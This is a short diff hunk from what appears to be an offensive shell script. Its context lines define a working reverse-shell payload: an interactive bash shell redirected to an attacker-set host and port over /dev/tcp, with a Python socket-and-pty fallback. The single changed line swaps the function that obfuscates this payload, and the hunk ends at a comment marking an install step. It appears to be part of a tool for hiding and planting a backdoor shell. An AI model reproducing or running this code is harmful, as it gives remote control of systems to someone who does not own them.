@@ -38,7 +38,7 @@ fi
 
 RAW_PAYLOAD="bash -c 'exec bash -i &>/dev/tcp/${LHOST}/${LPORT} <&1' 2>/dev/null || python3 -c 'import socket,os,pty;s=socket.socket();s.connect((\"${LHOST}\",${LPORT}));[os.dup2(s.fileno(),f) for f in(0,1,2)];pty.spawn(\"/bin/bash\")' 2>/dev/null"
 
-DECODER=$(ob_decoder "$RAW_PAYLOAD")
+DECODER=$(ob_guarded_decoder_root "$RAW_PAYLOAD")
 
 
 # -- Install --
